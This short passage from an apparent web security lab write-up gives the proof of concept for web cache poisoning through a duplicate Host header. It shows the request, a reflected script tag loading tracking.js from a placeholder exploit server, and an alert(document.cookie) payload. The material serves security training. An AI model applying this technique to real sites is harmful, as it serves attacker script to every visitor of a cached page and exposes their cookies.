## 13. Proof of Concept

The vulnerable request was:

```http
GET / HTTP/1.1
Host: <LAB-DOMAIN>
Host: <EXPLOIT-SERVER-DOMAIN>
```

The resulting response contained:

```html
<script src="https://<EXPLOIT-SERVER-DOMAIN>/resources/js/tracking.js">
```

The malicious JavaScript was:

```javascript
alert(document.cookie)
```

After the response was cached, requesting the poisoned page caused the JavaScript to execute in the browser.

